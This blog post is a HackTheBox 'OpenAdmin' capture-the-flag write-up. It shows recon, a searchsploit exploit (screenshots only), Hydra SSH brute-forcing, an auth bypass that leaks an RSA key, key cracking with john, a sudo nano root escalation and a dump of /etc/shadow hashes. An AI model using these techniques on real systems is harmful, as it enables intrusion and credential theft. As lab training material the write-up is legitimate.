---
title: HackTheBox OpenAdmin Writeup
author: dumb
date: 2019-12-08 14:10:00 +0800
categories: [Blogging, Tutorial]
tags: [ctf, htb]
---






# Recon 


![alt text](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/d2dd3736b43d888cb90406e095c8afb4.png)


Fireup gobutser with common.txt list.



```bash 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/07 15:39:55 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/artwork (Status: 301)
/index.html (Status: 200)
/music (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/07 15:41:01 Finished
===============================================================


```

***



![c40d905c8b2480a3ec7b96ec11059884.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/c40d905c8b2480a3ec7b96ec11059884.png)



***

Clik in the Login we arrive in the page bellow:


![28162194d4f4bfae90492fa0cde51cdc.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/28162194d4f4bfae90492fa0cde51cdc.png)


# Scan

```bash
# Nmap 7.80 scan initiated Tue Apr  7 15:35:36 2020 as: nmap -sC -sV -p22,80 -oA nmap-all-10.10.10.171 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr  7 15:35:48 2020 -- 1 IP address (1 host up) scanned in 12.41 seconds
```

# Pwn

Login in the pannel with ***dmin:admin*** we can run the exploit foudn in searchexploit:

![d79594c4e4363d19accca2ac798bba92.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/d79594c4e4363d19accca2ac798bba92.png)



![a8f2e39f902dd8551401defc17a2e725.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/a8f2e39f902dd8551401defc17a2e725.png)



![b0301fb5a1d49aada56bad88bd295c62.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/b0301fb5a1d49aada56bad88bd295c62.png)



```bash

find / -type f -user www-data

```


![189ea786f38e3eeb22b35386544690ed.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/189ea786f38e3eeb22b35386544690ed.png)


![2b3f5ae27991945eb9189ae16ad052e6.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/b0301fb5a1d49aada56bad88bd295c62.png)


```bash

$ ss -nltp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         128               127.0.0.1:52846            0.0.0.0:*
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
LISTEN   0         128                       *:80                     *:*
LISTEN   0         128                    [::]:22                  [::]:*

$ curl http://127.0.0.1:52846

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
                </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "/index.php" method = "post">
            <h4 class = "form-signin-heading"></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
$

```

```bash
$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

$ ls /home -alh
total 16K
drwxr-xr-x  4 root   root   4.0K Nov 22 18:00 .
drwxr-xr-x 24 root   root   4.0K Nov 21 13:41 ..
drwxr-x---  5 jimmy  jimmy  4.0K Apr  7 05:54 jimmy
drwxr-x---  6 joanna joanna 4.0K Nov 28 09:37 joanna

```


After that, I create a user listw with this names and try the password found in database settings:

```bash

hydra -L users.txt -e nsr -P dic.lst ssh://10.10.10.171 -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-07 18:24:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:2/p:4), ~1 try per task
[DATA] attacking ssh://10.10.10.171:22/
[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-07 18:24:49

```




![d662f793cc11869c2685f9e6388a3b9d.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/d662f793cc11869c2685f9e6388a3b9d.png)



# User 

First I try access the server hosted in port *52846*. For this I set a proxy using ssh:

![a8686979b7a1ea50c656499aa284585b.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/a8686979b7a1ea50c656499aa284585b.png)

![8dea4629f0d6c6725360886a95b1885a.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/8dea4629f0d6c6725360886a95b1885a.png)



Lookoup for this particular string in server give me the folder of the server:

```bash
grep: /var/lock/lvm: Permission denied
jimmy@openadmin:~$ grep -Ri 'Login Restricted.' /var 2>/dev/null
jimmy@openadmin:~$ grep -Ri 'Login Restricted.' /var 2>/dev/null
/var/www/internal/index.php:        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
jimmy@openadmin:~$

```

![eb8ead9e603a8f1895784adfa366f2d3.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/eb8ead9e603a8f1895784adfa366f2d3.png)



Scrap the directory we lookop the important information: 

```bash
jimmy@openadmin:/var/www/internal$ ls -alh
total 20K
drwxrwx--- 2 jimmy internal 4.0K Apr  7 05:54 .
drwxr-xr-x 4 root  root     4.0K Nov 22 18:15 ..
-rwxrwxr-x 1 jimmy internal 3.2K Nov 22 23:24 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php
jimmy@openadmin:/var/www/internal$

```


Lookup for the content of the index.php and main.php:



![0bfdd5dda6554a12587f8207044c85b9.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/0bfdd5dda6554a12587f8207044c85b9.png)


![d3bc9a80ecbfe73e2df15accb7024cee.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/d3bc9a80ecbfe73e2df15accb7024cee.png)


Analysing this two files we can see If we change the source Ip address , we bypass the auth mecanism. So we did:

```bash
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>

```

We grab this ssh key and convert do john format to crack them: 

```bash

dumbland () hgfs/hackthebox/openadmin :: locate ssh2john
/usr/share/john/ssh2john.py
dumbland () hgfs/hackthebox/openadmin :: sudo john ssh-john-format.txt -w=dic.lst
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidate left, minimum 2 needed for performance.
0g 0:00:00:00 DONE (2020-04-07 18:50) 0g/s 100.0p/s 100.0c/s 100.0C/s n1nj4W4rri0R!
Session completed
dumbland () hgfs/hackthebox/openadmin :: sudo john ssh-john-format.txt -w=/mnt/hgfs/hackthebox/json/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (ssh-key.txt)
1g 0:00:00:06 DONE (2020-04-07 18:51) 0.1652g/s 2370Kp/s 2370Kc/s 2370KC/sa6_123..*7¡Vamos!
Session completed

dumbland () hgfs/hackthebox/openadmin :: ssh -i ssh-key.txt joanna@10.10.10.171                                                                                                       127 ↵
Enter passphrase for key 'ssh-key.txt':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Apr  7 22:55:34 UTC 2020

  System load:  0.0               Processes:             401
  Usage of /:   50.0% of 7.81GB   Users logged in:       0
  Memory usage: 40%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr  7 05:59:31 2020 from 10.10.14.36
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af62660f0c81b5f

```


***


# Priv Esc


```bash
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv

```


![45586691f8d2c7f576a0bf31f8f96c8e.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/45586691f8d2c7f576a0bf31f8f96c8e.png)



![d98ee2b80b88e336f9390d2b0cf23414.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/d98ee2b80b88e336f9390d2b0cf23414.png)


And after save the file we become root:

```bash

joanna@openadmin:~$ sudo /bin/nano /opt/priv
joanna@openadmin:~$ sudo su -
root@openadmin:~# id
uid=0(root) gid=0(root) groups=0(root)
root@openadmin:~# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
root@openadmin:~#
```


![007987a57de6b4d4c115da56bdd370fc.png](https://github.com/dumbx90/adventures/raw/master/assets/img/commons/007987a57de6b4d4c115da56bdd370fc.png)


# /etc/shadow

```bash
joanna@openadmin:~$ sudo su -
root@openadmin:~# id
uid=0(root) gid=0(root) groups=0(root)
root@openadmin:~# cat /root/root.txt
2f907ed450b361b2c2bf4e8795d5b561
root@openadmin:~#
root@openadmin:~# cat /etc/shadow
root:$6$BGk6CBPE$FoDCUgY.1pnYDkqDr4.yNm4jQqnnG7side9P6ApdQWWqLr6t1DHq/iXuNF7F0fkivSYXajUp/bK2cw/D/3ubU/:18222:0:99999:7:::
daemon:*:18113:0:99999:7:::
bin:*:18113:0:99999:7:::
sys:*:18113:0:99999:7:::
sync:*:18113:0:99999:7:::
games:*:18113:0:99999:7:::
man:*:18113:0:99999:7:::
lp:*:18113:0:99999:7:::
mail:*:18113:0:99999:7:::
news:*:18113:0:99999:7:::
uucp:*:18113:0:99999:7:::
proxy:*:18113:0:99999:7:::
www-data:*:18113:0:99999:7:::
backup:*:18113:0:99999:7:::
list:*:18113:0:99999:7:::
irc:*:18113:0:99999:7:::
gnats:*:18113:0:99999:7:::
nobody:*:18113:0:99999:7:::
systemd-network:*:18113:0:99999:7:::
systemd-resolve:*:18113:0:99999:7:::
syslog:*:18113:0:99999:7:::
messagebus:*:18113:0:99999:7:::
_apt:*:18113:0:99999:7:::
lxd:*:18113:0:99999:7:::
uuidd:*:18113:0:99999:7:::
dnsmasq:*:18113:0:99999:7:::
landscape:*:18113:0:99999:7:::
pollinate:*:18113:0:99999:7:::
sshd:*:18221:0:99999:7:::
jimmy:$6$XnCB2K/6$QALmpgLWhDwUjcNldzgtafb6Tt1dT.uyIfxdhDYOVGdlNgIyDX89hz29P.aDQM9OBSSsI2dJGUYYTmQtdb2zw.:18222:0:99999:7:::
mysql:!:18221:0:99999:7:::
joanna:$6$gmFfLksM$XJl08bIFRUki/Lecq8RKFzFFvleGn9CjiqrQxU4n/l6JZe/FSRbe0I/W3L86yWibCJejfrMzgH3HvUezxhCWI0:18222:0:99999:7:::
root@openadmin:~#
```







